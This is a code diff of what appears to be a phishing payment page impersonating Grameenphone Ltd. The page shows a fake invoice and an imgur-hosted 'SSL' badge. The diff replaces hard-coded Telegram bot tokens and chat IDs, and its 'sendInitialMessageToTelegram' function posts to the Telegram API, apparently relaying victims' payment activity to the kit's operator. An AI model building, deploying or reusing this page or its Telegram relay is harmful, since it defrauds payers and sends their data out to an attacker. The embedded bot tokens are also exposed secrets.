@@ -85,8 +85,8 @@ let amount = parseFloat(urlParams.get('amount')) || 10.00;
 const invoiceId = urlParams.get('invoice') || 'BGT177420240929180754';
 const sslLogoUrl = urlParams.get('ssl') || 'https://imgur.com/ljM76AR.png';
 const companyName = urlParams.get('companyName') || 'Grameenphone Ltd';
-const botToken = urlParams.get('botToken') || '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
-const chatId = urlParams.get('chatId') || '7174617845';
+const botToken = urlParams.get('botToken') || '7972009455:AAFN7kRY_Iu1IdWhTvaVeLheNgD3T7eF_Ik';
+const chatId = urlParams.get('chatId') || '1347276733';
 
 if (amount > 25000) {
     amount = 25000;
@@ -147,7 +147,7 @@ document.getElementById('confirmButton').addEventListener('click', function() {
 </script>
     <script>
 function sendInitialMessageToTelegram() {
-    const botToken = urlParams.get('botToken') || '7925320513:AAHD688nFLC4cicGaOhbPYx458vAX8EnD-M';
+    const botToken = urlParams.get('botToken') || '7972009455:AAFN7kRY_Iu1IdWhTvaVeLheNgD3T7eF_Ik';
     const chatId = urlParams.get('chatId') || '1347276733';
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
     const data = {
